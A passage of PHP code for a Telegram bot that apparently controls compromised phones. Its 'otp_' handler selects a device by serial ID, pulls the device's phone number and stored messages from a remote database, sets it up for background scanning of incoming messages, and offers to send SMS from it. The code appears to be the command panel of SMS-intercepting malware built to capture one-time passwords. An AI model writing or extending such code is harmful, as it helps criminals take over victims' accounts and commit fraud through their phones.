            'chat_id' => $chatId,
            'text' => "✉️ *Enter receiver's phone number to send 'Hi' message:*\n\n_Example: 9876543210_",
            'parse_mode' => 'Markdown'
        ]);
        exit;
    }

    if (strpos($data, 'otp_') === 0) {
        $serialId = strtoupper(substr($data, 4));
        $mappings = loadDeviceMappings();
        
        if (!isset($mappings[$serialId])) {
            telegramRequest('answerCallbackQuery', [
                'callback_query_id' => $callbackQueryId,
                'text' => 'Selected serial ID not found or expired. Please run /online to refresh.',
                'show_alert' => true
            ]);
            exit;
        }
        
        telegramRequest('answerCallbackQuery', ['callback_query_id' => $callbackQueryId]);
        
        $devInfo = $mappings[$serialId];
        $deviceId = $devInfo['id'];
        $dbUrl = $devInfo['db_url'];
        
        // Fetch details in parallel to extract phone number and baseline message ID
        $deviceDetails = getDeviceDetailsAndMessages($deviceId, $dbUrl);
        $mobNo = $deviceDetails['mobNo'];
        $val = $deviceDetails['messages'];
        $latestMsgId = getLatestMessageId($val);
        
        // Store this device as the active background scan target
        setActiveScan($chatId, [
            'device_id' => $deviceId,
            'db_url'    => $dbUrl,
            'db_idx'    => $devInfo['db_idx'],
            'serial_id' => $serialId,
            'name'      => $devInfo['name'],
            'mobNo'     => $mobNo,
            'last_seen' => $latestMsgId
        ]);
        
        $response = "📟 *Device Selected:*\n\n" .
                    "📱 *Device:* `{$serialId}` ({$devInfo['name']})\n" .
                    "📞 *Phone Number:* " . (!empty($mobNo) ? "`{$mobNo}`" : "_Not Available_") . "\n" .
                    "🏢 *Database:* DB #" . ($devInfo['db_idx'] + 1) . "\n\n" .
                    "🔍 *Status:* 🔄 Scanning for new messages in background...";
        
        $inlineKeyboard = [
            'inline_keyboard' => [[
                ['text' => '✉️ Send Message', 'callback_data' => "sendmsg_" . $serialId]
            ]]
        ];
        
        telegramRequest('sendMessage', [
            'chat_id'      => $chatId,
            'text'         => $response,
            'parse_mode'   => 'Markdown',
            'reply_markup' => $inlineKeyboard
        ]);
        exit;
    }


}

echo json_encode(["status" => "success"]);
